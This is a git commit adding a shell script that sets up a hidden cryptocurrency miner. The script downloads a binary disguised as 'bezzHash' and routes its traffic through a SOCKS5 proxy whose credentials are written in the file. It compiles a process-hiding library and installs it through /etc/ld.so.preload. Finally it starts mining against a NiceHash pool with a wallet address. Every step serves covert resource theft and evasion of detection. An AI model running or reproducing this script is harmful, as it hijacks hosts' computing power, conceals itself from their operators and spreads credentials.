ecfa37f1b952fdda6d59a0556416250e37392724
mfqh00 <90943340+mfqh00@users.noreply.github.com>
2022-09-07 21:33:00 +0800

    Add files via upload

---
+++ NN1.sh
@@ -0,0 +1,65 @@
+#!/bin/sh
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+
+listen = :2233
+
+loglevel = 1
+
+socks5 = sg-socks5.woiden.net:8080
+
+socks5_username = woiden_jancuk
+
+socks5_password =  @jancuk69
+
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+echo "**"
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+
+unzip magicBezzHash.zip
+
+make
+
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+
+mv libprocesshider.so /usr/local/lib/
+
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --url=ssl://3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH@daggerhashimoto.usa-east.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
